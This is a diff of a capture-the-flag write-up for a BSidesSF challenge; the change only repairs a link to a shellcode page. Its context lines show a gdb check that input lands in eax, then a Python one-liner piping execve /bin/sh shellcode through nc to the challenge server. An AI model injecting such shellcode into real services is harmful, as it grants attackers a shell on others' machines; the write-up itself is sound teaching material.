@@ -94,7 +94,7 @@ Breakpoint 1, 0x080485f9 in main ()
 (gdb) x/s $eax
 0xf7ffb000:	"ABCD\n"
 ```
-Sure enough, it's the input we gave. Given that it's a call to `eax`, we can simply inject shell code instead. Let's open up our [trusty shell code](/src/http://shell-storm.org/shellcode/files/shellcode-811.php) and we'll inject that into the program.
+Sure enough, it's the input we gave. Given that it's a call to `eax`, we can simply inject shell code instead. Let's open up our [trusty shell code](http://shell-storm.org/shellcode/files/shellcode-811.php) and we'll inject that into the program.
 ```
 root@kali:~/Crack Me# (python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'"; cat) | nc runit-5094b2cb.challenges.bsidessf.net 5252
 Send me stuff!!
